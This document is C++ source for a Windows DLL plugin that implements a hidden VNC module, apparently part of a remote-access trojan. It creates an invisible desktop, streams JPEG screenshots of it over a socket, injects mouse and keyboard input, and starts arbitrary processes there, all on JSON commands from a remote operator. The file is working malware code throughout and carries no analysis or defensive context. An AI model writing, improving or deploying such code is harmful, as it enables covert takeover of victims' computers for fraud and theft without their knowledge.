#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <condition_variable>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HIDDEN_VNC_FRAME = 0x06;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_vncSocket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static int g_jpegQuality = 50;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static HDESK g_hHiddenDesktop = NULL;
static const wchar_t* HIDDEN_DESKTOP_NAME = L"HiddenVNC_Desktop";

struct InputEvent {
    string type;
    string event;
    int button;
    int x, y;
    int vk;
};

static queue<InputEvent> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCv;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

static bool safe_send_raw(SOCKET sock, const string& data) {
    if (sock == INVALID_SOCKET) return false;
    const char* ptr = data.c_str();
    int remaining = (int)data.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_vnc_frame(SOCKET sock, int scale, int width, int height, const vector<unsigned char>& jpegBytes) {
    if (sock == INVALID_SOCKET || jpegBytes.empty()) return false;
    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = 0;
    frameHeader.scale = (uint32_t)scale;
    frameHeader.fps = (uint32_t)g_targetFps;
    frameHeader.width = (uint32_t)width;
    frameHeader.height = (uint32_t)height;
    frameHeader.format = MONITOR_FRAME_FORMAT_JPEG;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();
    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_HIDDEN_VNC_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + (uint32_t)jpegBytes.size());
    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], jpegBytes.data(), jpegBytes.size());
    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_vnc_error(SOCKET sock, const string& message) {
    if (sock == INVALID_SOCKET) return;
    json response;
    response["action"] = "hiddenvnc_error";
    response["error"] = message;
    safe_send_json(sock, response);
}

static void send_vnc_status(SOCKET sock, const string& status) {
    if (sock == INVALID_SOCKET) return;
    json response;
    response["action"] = "hiddenvnc_status";
    response["status"] = status;
    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();
    if (!ensure_gdiplus()) { error = "GDI+ fail"; return false; }
    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) { error = "No JPEG encoder"; return false; }
    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) { error = "Bitmap fail"; return false; }
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) { error = "Stream fail"; return false; }
    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;
    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) { stream->Release(); error = "Save fail"; return false; }
    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) { stream->Release(); error = "Stat fail"; return false; }
    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();
    return true;
}

static bool init_hidden_desktop() {
    if (g_hHiddenDesktop) return true;
    g_hHiddenDesktop = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(HIDDEN_DESKTOP_NAME, NULL, NULL, 0, GENERIC_ALL, NULL);
    }
    return g_hHiddenDesktop != NULL;
}

static void input_worker() {
    if (!init_hidden_desktop()) return;
    SetThreadDesktop(g_hHiddenDesktop);
    while (g_inputRunning.load()) {
        InputEvent ev;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCv.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning.load(); });
            if (!g_inputRunning.load() && g_inputQueue.empty()) break;
            ev = g_inputQueue.front();
            g_inputQueue.pop();
        }
        if (ev.type == "mouse") {
            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            int realX = MulDiv(ev.x, sw, 65535);
            int realY = MulDiv(ev.y, sh, 65535);
            HWND hWnd = WindowFromPoint({ realX, realY });
            if (hWnd) {
                POINT pt = { realX, realY };
                ScreenToClient(hWnd, &pt);
                LPARAM lParam = MAKELPARAM(pt.x, pt.y);
                if (ev.event == "move") PostMessageA(hWnd, WM_MOUSEMOVE, 0, lParam);
                else if (ev.event == "down") {
                    UINT msg = (ev.button == 0) ? WM_LBUTTONDOWN : WM_RBUTTONDOWN;
                    PostMessageA(hWnd, msg, (ev.button == 0) ? MK_LBUTTON : MK_RBUTTON, lParam);
                } else if (ev.event == "up") {
                    UINT msg = (ev.button == 0) ? WM_LBUTTONUP : WM_RBUTTONUP;
                    PostMessageA(hWnd, msg, 0, lParam);
                }
            }
        } else if (ev.type == "key") {
            HWND hWnd = GetForegroundWindow();
            if (hWnd) {
                PostMessageA(hWnd, (ev.event == "down") ? WM_KEYDOWN : WM_KEYUP, ev.vk, 0);
            }
        }
    }
}

static void capture_loop() {
    if (!init_hidden_desktop()) {
        send_vnc_error(g_vncSocket, "Desktop init fail");
        g_captureRunning = false; return;
    }
    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        send_vnc_error(g_vncSocket, "SetThreadDesktop fail");
        g_captureRunning = false; return;
    }
    while (g_captureRunning.load()) {
        DWORD start = GetTickCount();
        int scale = 50, quality = 50; SOCKET sock = INVALID_SOCKET;
        {
            lock_guard<mutex> l(g_captureMutex); scale = g_scalePercent; quality = g_jpegQuality; sock = g_vncSocket;
        }
        if (sock == INVALID_SOCKET) break;

        HDC hdc = GetDC(NULL);
        if (hdc) {
            int sw = GetDeviceCaps(hdc, HORZRES);
            int sh = GetDeviceCaps(hdc, VERTRES);
            if (sw <= 0) sw = GetSystemMetrics(SM_CXSCREEN);
            if (sh <= 0) sh = GetSystemMetrics(SM_CYSCREEN);

            if (sw > 0 && sh > 0) {
                int dw = (sw * scale) / 100;
                int dh = (sh * scale) / 100;
                HDC hdcMem = CreateCompatibleDC(hdc);
                if (hdcMem) {
                    HBITMAP hbm = CreateCompatibleBitmap(hdc, dw, dh);
                    if (hbm) {
                        HGDIOBJ old = SelectObject(hdcMem, hbm);
                        SetStretchBltMode(hdcMem, COLORONCOLOR);
                        if (StretchBlt(hdcMem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY | CAPTUREBLT)) {
                            vector<unsigned char> jpeg; string err;
                            if (bitmap_to_jpeg(hbm, (ULONG)quality, jpeg, err)) {
                                safe_send_vnc_frame(sock, scale, dw, dh, jpeg);
                            }
                        }
                        SelectObject(hdcMem, old); DeleteObject(hbm);
                    }
                    DeleteDC(hdcMem);
                }
            }
            ReleaseDC(NULL, hdc);
        }
        DWORD elapsed = GetTickCount() - start;
        DWORD wait = 1000 / max(1, g_targetFps);
        if (elapsed < wait) Sleep(wait - elapsed); else Sleep(1);
    }
}

static void start_capture(SOCKET sock, int quality) {
    {
        lock_guard<mutex> l(g_captureMutex); g_vncSocket = sock; g_jpegQuality = quality;
    }
    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable()) g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }
    send_vnc_status(sock, "started");
}

static void run_process(SOCKET sock, const string& path) {
    init_hidden_desktop();
    wstring wPath(path.begin(), path.end());
    wstring wDesktop(HIDDEN_DESKTOP_NAME);
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = (LPWSTR)wDesktop.c_str();
    PROCESS_INFORMATION pi = { 0 };
    if (CreateProcessW(NULL, (LPWSTR)wPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        send_vnc_status(sock, "Process started: " + path);
    } else {
        send_vnc_error(sock, "Process fail: " + to_string(GetLastError()));
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    init_hidden_desktop();
    if (!g_inputRunning.exchange(true)) {
        if (g_inputThread.joinable()) g_inputThread.join();
        g_inputThread = thread(input_worker);
    }
    json res; res["action"] = "hiddenvnc_initialized"; res["status"] = "initialized";
    safe_send_json(sock, res);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json cmd = json::parse(cmdJson);
        string act = cmd.value("action", "");
        if (act == "vncstart") start_capture(sock, cmd.value("quality", 50));
        else if (act == "vncstop") { g_captureRunning = false; send_vnc_status(sock, "stopped"); }
        else if (act == "run") run_process(sock, cmd.value("path", ""));
        else if (act == "mouseevent") {
            InputEvent ev; ev.type = "mouse"; ev.event = cmd["event"]; ev.button = cmd["button"]; ev.x = cmd["x"]; ev.y = cmd["y"];
            { lock_guard<mutex> l(g_inputMutex); g_inputQueue.push(ev); }
            g_inputCv.notify_one();
        } else if (act == "keyevent") {
            InputEvent ev; ev.type = "key"; ev.event = cmd["event"]; ev.vk = cmd["key"];
            { lock_guard<mutex> l(g_inputMutex); g_inputQueue.push(ev); }
            g_inputCv.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false; g_inputRunning = false; g_inputCv.notify_all();
        if (g_captureThread.joinable()) g_captureThread.join();
        if (g_inputThread.joinable()) g_inputThread.join();
        if (g_hHiddenDesktop) CloseDesktop(g_hHiddenDesktop);
        shutdown_gdiplus();
    }
    return TRUE;
}
